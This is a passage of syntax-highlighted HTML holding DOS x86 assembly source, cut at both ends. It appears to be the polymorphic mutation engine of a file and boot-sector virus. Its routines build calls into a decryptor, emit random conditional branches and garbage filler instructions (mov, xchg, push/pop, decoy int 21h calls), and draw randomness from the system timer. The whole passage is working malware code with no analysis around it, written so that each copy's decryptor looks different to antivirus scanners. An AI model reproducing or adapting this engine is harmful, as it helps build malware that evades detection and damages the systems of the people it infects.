        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate a call instruction to a subroutine witch contains</span><span class="sc0">
</span><span class="sc1">;next decryptor instruction</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">do_call_decryptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_store_call</span><span class="sc0">
</span><span class="sc1">;Save position        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_loop</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">no_store_call</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Build a call to our subroutine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_sub</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;Do not use this subrotine again</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_sub</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate a call instruction to a subroutine witch some garbage code</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">do_call_garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_subroutine</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Check if there is a subroutine to call</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ok_call</span><span class="sc0">
</span><span class="sc1">;No, so exit</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ok_call</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Build a call to our garbage subroutine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;Do not use this subrotine again</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_subroutine</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate a branch followed by some garbage code</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">do_branch</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Generate a random conditional jump instruction</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;Save address for jump construction</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;Get subroutine address</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;Generate some garbage code</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">
</span><span class="sc1">;Store jump displacement</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Lay down between 2 and 5 filler opcodes selected from the available</span><span class="sc0">
</span><span class="sc1">;types</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">g_generator</span><span class="sc4">:</span><span class="sc0">                        
</span><span class="sc1">;Get a random number for fill count                </span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">   
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">     
</span><span class="sc1">;Min 2, max 5 opcodes</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         
</span><span class="sc5">next_fill</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">new_fill</span><span class="sc4">:</span><span class="sc0">       
</span><span class="sc1">;Select the type of filler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">end_op_table</span><span class="sc4">-</span><span class="sc5">op_table</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0"> 
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">                
</span><span class="sc1">;Avoid same types in a row</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_fill_type</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">new_fill</span><span class="sc0">      
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_fill_type</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">op_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_fill</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Makes an opcode of type mov reg,immediate value</span><span class="sc0">
</span><span class="sc1">;either 8 or 16 bit value</span><span class="sc0">
</span><span class="sc1">;but never ax or al or sp,di,si or bp</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">move_imm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
</span><span class="sc1">;Get a reggie      </span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">  
</span><span class="sc1">;Make it a mov reg,</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">   
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00001000b</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">is_8bit_mov</span><span class="sc0">
</span><span class="sc1">;Make it ax,bx cx or dx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11111011b</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;Not ax or al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">move_imm</span><span class="sc0">           
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_16</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">is_8bit_mov</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">   
</span><span class="sc1">;Is al?</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">  
</span><span class="sc1">;Yeah bomb</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">move_imm</span><span class="sc0"> 
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Now we knock boots with mov reg,reg's</span><span class="sc0">
</span><span class="sc1">;but never to al or ax.</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">move_with_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_16</span><span class="sc0">
</span><span class="sc1">;Preserve reggies and 8/16 bit    </span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0011111100000001b</span><span class="sc0">  
</span><span class="sc1">;Or it with addr mode and make it mov</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1100000010001010b</span><span class="sc0">  
</span><span class="sc5">reg_test</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">is_8bit_move_with_reg</span><span class="sc0">
</span><span class="sc1">;Make source and dest = ax,bx,cx,dx    </span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11011011b</span><span class="sc0">         
</span><span class="sc5">is_8bit_move_with_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">
</span><span class="sc1">;No mov ax, 's please    </span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">move_with_reg</span><span class="sc0">       
</span><span class="sc1">;Let's see if 2 reggies are same reggies.    </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">              
        </span><span class="sc6">sal</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">sal</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">sal</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">
</span><span class="sc1">;Check if reg,reg are same</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">              
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">move_with_reg</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Modify a mov reg,reg into an xchg reg,reg</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">reg_exchange</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Make a mov reg,reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">move_with_reg</span><span class="sc0">  
</span><span class="sc1">;But then remove it</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">              
</span><span class="sc1">;And take advantage of the fact the opcode is still in ax  </span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">         
</span><span class="sc1">;Was a 16 bit type?</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1b</span><span class="sc0">        
</span><span class="sc1">;Yeah go for an 8 bitter</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">reg_exchange</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc1">;Is one of reggies ax?</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">         
</span><span class="sc1">;Yah so bomb</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">reg_exchange</span><span class="sc0">    
</span><span class="sc1">;Else make it xchg ah,dl etc...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10000110b</span><span class="sc0">   
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;We don't have to watch our stack if we pair up pushes with pops</span><span class="sc0">
</span><span class="sc1">;so I slapped together this peice of shoddy work to add em.</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">do_push_pop</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">end_bytes_2</span><span class="sc4">-</span><span class="sc5">bytes_2</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Generate push and pop instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">bytes_2</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate a random int 21h call.</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">do_int_21h</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Do not generate int 21h calls into boot sectore decryptor</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">prog_type</span><span class="sc4">],</span><span class="sc3">"B"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_generate_int</span><span class="sc0">
</span><span class="sc1">;Do not generate int 21h calls into decryption loop</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">no_in_loop</span><span class="sc0">
</span><span class="sc5">no_generate_int</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">no_in_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
</span><span class="sc1">;Choose within ah,function or ax,function+subfunction</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">do_int_ax</span><span class="sc0">
</span><span class="sc5">do_int_ah</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">end_ah_table</span><span class="sc4">-</span><span class="sc5">ah_table</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ah_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Do not generate same int's in a row</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_int_type</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">do_int_ah</span><span class="sc0">
</span><span class="sc1">;Generate mov ah,function        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_int_type</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;Generate int 21h        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">021CDh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">do_int_ax</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">end_ax_table</span><span class="sc4">-</span><span class="sc5">ax_table</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ax_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Do not generate same int's in a row</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_int_type</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">do_int_ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_int_type</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc1">;Generate mov ax,function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc2">0B8h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;Generate int 21h        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">021CDh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Simple timer based random numbers but with a twist using xor of last one.</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">get_rnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Randomize</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Randomize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;A small variation to compensate for lack of randomocity in the</span><span class="sc0">
</span><span class="sc1">;high byte of 16 bit result returned by get_rnd.</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">rand_16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate a random number betwin 0 and ax.</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">rand_in_range</span><span class="sc4">:</span><span class="sc0">  
</span><span class="sc1">;Returns a random num between 0 and entry ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">      
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;Remainder in dx</span><span class="sc0">
